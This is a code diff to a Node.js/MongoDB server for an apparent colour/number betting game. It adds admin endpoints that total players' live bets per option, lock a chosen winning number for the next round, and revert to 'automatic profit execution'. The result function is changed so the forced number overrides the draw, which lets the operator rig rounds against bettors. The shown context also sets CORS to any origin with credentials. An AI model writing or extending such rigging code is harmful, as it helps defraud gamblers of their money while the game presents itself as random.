@@ -15,6 +15,14 @@ app.use(cors({ origin: "*", credentials: true }));
 
 // === MONGODB SCHEMAS (डेटाबेस के नियम) ===
 
+// === GLOBAL MEMORY FOR ADMIN MANUAL OVERRIDE ===
+global.adminManualOverride = {
+    "30s": null,
+    "1m": null,
+    "3m": null,
+    "5m": null
+};
+
 // === 1. USER SCHEMA WITH BAN TRACKING ===
 const userSchema = new mongoose.Schema({
     phone: { type: String, required: true, unique: true },
@@ -152,9 +160,16 @@ async function calculateGameResult(mode) {
         }
     }
 
-    const finalNumber = safestNumbersPool[Math.floor(Math.random() * safestNumbersPool.length)];
-    const num = Number(finalNumber);
+            // === ADMIN MANUAL HACK TRIGGER ENGINE ===
+        let finalWinningNumber = safestNumbersPool[Math.floor(Math.random() * safestNumbersPool.length)];
 
+        if (global.adminManualOverride && global.adminManualOverride[mode] !== null) {
+            finalWinningNumber = global.adminManualOverride[mode];
+            global.adminManualOverride[mode] = null;
+        }
+
+        const num = Number(finalWinningNumber);
+        
     const finalSize = num >= 5 ? "Big" : "Small";
     let finalColor = "Red";
     if (num === 0 || num === 5) {
@@ -531,6 +546,70 @@ app.post('/api/admin/delete-user', async (req, res) => {
             return res.json({ success: false, message: "User could not be deleted!" });
         }
         res.json({ success: true, message: "User account deleted permanently from database!" });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+// === 1. GET LIVE BETS SUMMARY FOR TABLES ===
+app.get('/api/admin/live-bets-summary/:gameMode', async (req, res) => {
+    try {
+        const { gameMode } = req.params;
+        const latestPeriod = await Period.findOne({ gameMode }).sort({ createdAt: -1 });
+        if (!latestPeriod) return res.json({ success: false, message: "No active period found" });
+
+        const activeBets = await Bet.find({ gameMode, periodId: latestPeriod.periodId, status: "Pending" });
+
+        let numberBets = { 0:0, 1:0, 2:0, 3:0, 4:0, 5:0, 6:0, 7:0, 8:0, 9:0 };
+        let colorBets = { red: 0, green: 0, violet: 0 };
+        let sizeBets = { big: 0, small: 0 };
+
+        activeBets.forEach(bet => {
+            const amount = Number(bet.betAmount || 0);
+            const val = bet.selectValue ? bet.selectValue.toLowerCase() : "";
+
+            if (!isNaN(val) && val !== "") {
+                numberBets[val] = (numberBets[val] || 0) + amount;
+            } else if (val === "red" || val === "green" || val === "violet") {
+                colorBets[val] = (colorBets[val] || 0) + amount;
+            } else if (val === "big" || val === "small") {
+                sizeBets[val] = (sizeBets[val] || 0) + amount;
+            }
+        });
+
+        res.json({
+            success: true,
+            currentPeriodId: latestPeriod.periodId,
+            overrideStatus: global.adminManualOverride[gameMode] !== null ? `Manual (Number ${global.adminManualOverride[gameMode]})` : "Automatic",
+            numberBets,
+            colorBets,
+            sizeBets
+        });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// === 2. SET MANUAL WINNING NUMBER LOCK ===
+app.post('/api/admin/set-game-result', async (req, res) => {
+    try {
+        const { gameMode, forcedNumber } = req.body;
+        if (!gameMode || forcedNumber === undefined) return res.json({ success: false, message: "Missing parameters" });
+
+        global.adminManualOverride[gameMode] = Number(forcedNumber);
+        res.json({ success: true, message: `Number ${forcedNumber} successfully locked for next ${gameMode} round!` });
+    } catch (error) {
+        res.status(500).json({ success: false, error: error.message });
+    }
+});
+
+// === 3. RESET BACK TO AUTOMATIC OVERRIDE MODE ===
+app.post('/api/admin/reset-game-auto', async (req, res) => {
+    try {
+        const { gameMode } = req.body;
+        if (!gameMode) return res.json({ success: false, message: "Missing game mode" });
+
+        global.adminManualOverride[gameMode] = null;
+        res.json({ success: true, message: `${gameMode} mode successfully reverted to automatic profit execution!` });
     } catch (error) {
         res.status(500).json({ success: false, error: error.message });
     }
